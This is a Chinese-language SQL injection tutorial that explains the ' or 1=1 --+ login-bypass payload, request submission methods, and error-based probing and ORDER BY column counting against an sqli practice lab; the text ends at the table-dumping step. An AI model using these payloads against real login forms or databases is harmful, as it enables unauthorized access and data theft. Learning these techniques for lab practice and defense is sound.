# SQL注入

## <font color = #1E90FF>万能密码登录案例</font>

- **登录SQL的语句**
```mysql
select*from admin where username = '用户输入的用户名' and passworld = '用户输入的密码'	
```
- **万能密码**

    ```
    ' or 1=1 --+	#永远为真

    --+             #注释掉后面的内容不再执行
    ```

## <font color = #1E90FF>注入提交方式</font>

- **get**
```
一般通过浏览器提交
```
- **post**
```
一般用于文件上传等
```
- **ASP:**
```asp
	request	                #全部接受
	request.querystring	    #接受get
	request.form	            #接受post
	request.cookie	        #接受cookie
```
- **PHP:**
```php
	$_REQUEST	    #全部接受
	$_GET$_POST	    #接受get
	$_COOKIE	    #接受cookie
```

## <font color = #1E90FF>整型注入</font>
- **判断是否有注入** <font color = #FF0000>（判断是否未严格校验）---->第一要素</font><BR>
	- 1）可控参数的改变是否能影响页面显示结果
	- 2）输入的SQL语句是否能报错----能通过数据库的报错，看到数据库的一些语句痕迹
	        select username，password from user where id =?'
	- 3）输入的SQL语句是否不报错----我们的语句能够成功闭合
- **2.什么类型的注入**
- **3.语句是否能够被恶意修改**<font color = #FF0000>----->第二要素</font><BR>
- **4.是否能够成功执行**<font color = #FF0000>----->第三要素</font><BR>
- **5.获取我们想要的数据**

### <font color = #FF0000>1.打开sqli靶场，在url后添加`'`号，报错</font><BR>
</figure>
     <figure class="thumbnails">
        <img src="picture/SQLzhuru/1.png">
</figure>

- 错误信息如下:
```
     check the manual that corresponds to your MySQL server version for the right syntax to use near '  '" LIMIT 0,1    ' at line 1
```
```mysql
     select username，password from user where id ='?''
```

- 可以看出多了个单引号，说明可能是 `id='?'`

### <font color = #FF0000>2.下面猜字段数</font><BR>
```
order by 数字       #猜字段数
如：
    order by  2
```
### <font color = #FF0000>3.爆表</font><BR>


